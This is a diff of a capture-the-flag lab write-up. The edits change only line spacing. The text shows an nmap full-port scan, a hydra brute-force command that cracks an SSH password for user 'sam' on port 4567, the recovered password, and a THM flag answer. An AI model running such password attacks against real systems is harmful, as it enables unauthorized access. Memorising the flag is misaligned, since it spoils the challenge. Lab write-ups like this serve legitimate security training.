@@ -22,8 +22,7 @@ td:lr Answer: **THM{b27d33705f97ba2e1f444ec2da5f5f61}**
 
 First, we need to do a nmap scan to find out which port is SSH running on
 
-`nmap -T4 [ip] -p-`
- 
+`nmap -T4 [ip] -p-`  
  -p- to scan all 65535 TCP ports (default scans first 1000 ports)
 
 we will reveal port 4567 as an open SSH port
@@ -33,8 +32,7 @@ we will reveal port 4567 as an open SSH port
 
 Next we need to use hydra to crack sam's password
 
-`hydra -l sam -P <filepath>/rockyou.txt [ip] -s 4567 -t 4 ssh`
- 
+`hydra -l sam -P <filepath>/rockyou.txt [ip] -s 4567 -t 4 ssh`  
  -we need to explicitly provide -s 4567 for hydra to crack at port 4567, else it will work on default SSH port 22
 
 we will get the password: **chocolate**
